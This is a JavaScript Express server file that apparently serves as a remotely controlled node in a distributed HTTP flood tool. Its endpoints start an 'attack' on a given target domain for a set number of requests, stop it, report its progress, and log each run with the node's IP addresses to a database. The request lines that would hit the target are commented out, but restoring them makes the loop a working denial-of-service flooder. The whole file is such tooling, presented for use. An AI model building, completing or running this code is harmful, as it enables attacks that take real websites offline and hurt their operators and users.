import express from 'express';
import db from './models/attackInfoSchema.js'
import dbServers from './models/serverSchema.js'
import getPrivateIP from './functions/getPrivateIp.js'
import getTime from './functions/getTime.js';

const app = express();

var stop = false;
var attackParams = {};

app.get('/stop/:url/:dom/:times/:id', async (req, res) => {
    if (stop == true) return res.send("[SERVER] There are no attacks currently. ")

    if (
        attackParams.url == req.params.url &&
        attackParams.dom == req.params.dom &&
        attackParams.times == req.params.times &&
        attackParams.id == req.params.id
    ) {
        res.send("[SERVER] Attack stopped succesfully.")
        console.log("[SERVER] Attack stopped succesfully.")
        attackParams = {}
        stop = true;
        await dbServers.findByIdAndUpdate(req.params.id, { isAttacking: false });
    } else {
        stop = false
        console.log("[SERVER] Attack has not been stopped.")
        res.send("[SERVER] Attack has not been stopped.")
    }
})

app.get("/infoAttack/:id", async (req, res) => {
    if (attackParams == {} || req.params.id !== attackParams.id) {
        return res.json({ error: "The attack id is not valid or there are no attacks now." });
    }

    res.json(attackParams);
})

app.get('/attackurl/:url/:dom/:times/:id', async (req, res) => {
    const startTime = new Date().getTime();
    let n = 0;

    await dbServers.findByIdAndUpdate(req.params.id, { isAttacking: true });

    attackParams = {
        url: req.params.url,
        dom: req.params.dom,
        timesRealized: 0,
        times: req.params.times,
        timesStarted: startTime,
        id: req.params.id,
        finished: false
    }

    async function attack(i) {
        if (stop) {
            stop = false;
            attackParams.finished = true;
            return otherCode(n);
        };

        if (n < i) {
            n++
            attackParams.timesRealized = n;


            setTimeout(async () => {
                console.log(`[${n}] [Server] Attacking URL: http://${req.params.url}.${req.params.dom}`)

                if (n == 1000) {
                    console.log("Stopping one second")
                    setTimeout(() => {
                        //fetch("http://" + req.params.url + "." + req.params.dom)
                        n++
                    }, 500)
                }
                //fetch("http://" + req.params.url + "." + req.params.dom)

                await attack(req.params.times)
            })
        } else {
            attackParams.finished = true;
            await otherCode()
            return;
        }
    }

    await attack(req.params.times)

    async function otherCode(n) {
        if (n) {
            req.params.times = n
        }

        const endTime = new Date().getTime();
        const tiempoTranscurrido = endTime - startTime;

        const horas = Math.floor(tiempoTranscurrido / (1000 * 60 * 60));
        const minutos = Math.floor((tiempoTranscurrido % (1000 * 60 * 60)) / (1000 * 60));
        const segundos = Math.floor((tiempoTranscurrido % (1000 * 60)) / 1000);
        const msg = `[Server] [${horas}h - ${minutos}m - ${segundos}s] Se han realizado ${req.params.times} peticiones a ${req.params.url}.${req.params.dom}`;

        console.log(msg);
        res.send(msg);

        const privateIP = getPrivateIP();
        const publicIP = req.headers['x-forwarded-for'] ? req.headers['x-forwarded-for'].split(',')[0] : req.connection.remoteAddress;

        const newAttackInformation = new db({
            serverID: `${req.params.id}`,
            url: `${req.params.url}.${req.params.dom}`,
            times: req.params.times,
            time: `[${horas}h - ${minutos}m - ${segundos}s]`,
            hourStart: getTime(startTime),
            hourEnd: getTime(endTime),
            publicIP: publicIP,
            privateIP: privateIP,
            port: process.env.PORT
        })

        await newAttackInformation.save()
        await dbServers.findByIdAndUpdate(req.params.id, { isAttacking: false });

        return;
    }
});

export default app